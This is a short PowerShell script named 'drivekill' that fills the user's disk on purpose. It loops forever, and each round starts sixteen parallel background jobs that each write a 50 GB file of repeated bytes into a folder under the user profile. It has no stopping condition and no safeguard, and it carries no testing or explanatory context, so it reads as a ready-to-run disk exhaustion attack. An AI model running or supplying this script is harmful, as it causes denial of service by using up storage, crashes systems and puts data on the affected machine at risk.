# ze config
$OutDir = Join-Path $env:USERPROFILE "drivekill"
$TargetBytes = 50GB             
$ParallelFiles = 16             
$ChunkSizeGB = 1                
$PatternBytes = 0x45,0x54,0x41 # ETA

if (-not (Test-Path $OutDir)) { New-Item -ItemType Directory -Path $OutDir | Out-Null }

function Get-ChunkBytes {
    param($ChunkSizeGB)
    $chunkLength = $ChunkSizeGB * 1GB
    $chunk = New-Object byte[] $chunkLength
    for ($i = 0; $i -lt $chunkLength; $i += $PatternBytes.Length) {
        for ($j = 0; $j -lt $PatternBytes.Length; $j++) {
            if ($i + $j -lt $chunkLength) { $chunk[$i + $j] = $PatternBytes[$j] }
        }
    }
    return $chunk
}

$ChunkBytes = Get-ChunkBytes -ChunkSizeGB $ChunkSizeGB

function Fill-File([int]$Index) {
    $FilePath = Join-Path $OutDir ("file$Index.dat")
    $fs = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::OpenOrCreate,
                                 [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
    try {
        $bytesWritten = 0
        $chunkLength = $ChunkBytes.Length
        while ($bytesWritten -lt $TargetBytes) {
            $remaining = $TargetBytes - $bytesWritten
            $writeLength = if ($remaining -lt $chunkLength) { $remaining } else { $chunkLength }
            $fs.Write($ChunkBytes,0,$writeLength)
            $bytesWritten += $writeLength
        }
    } finally { $fs.Close() }
}

# the good stuff
$fileIndex = 0
while ($true) {
    $jobs = @()
    for ($i = 0; $i -lt $ParallelFiles; $i++) {
        $currentIndex = $fileIndex + $i
        $jobs += Start-Job -ScriptBlock { param($idx,$chunk,$target,$out,$pattern)
            function Fill-File([int]$Index) {
                $FilePath = Join-Path $out ("file$Index.dat")
                $fs = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::OpenOrCreate,
                                             [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
                try {
                    $bytesWritten = 0
                    $chunkLength = $chunk.Length
                    while ($bytesWritten -lt $target) {
                        $remaining = $target - $bytesWritten
                        $writeLength = if ($remaining -lt $chunkLength) { $remaining } else { $chunkLength }
                        $fs.Write($chunk,0,$writeLength)
                        $bytesWritten += $writeLength
                    }
                } finally { $fs.Close() }
            }
            Fill-File $idx
        } -ArgumentList $currentIndex,$ChunkBytes,$TargetBytes,$OutDir,$PatternBytes
    }
    $fileIndex += $ParallelFiles
    Wait-Job -Job $jobs
    Remove-Job -Job $jobs
}
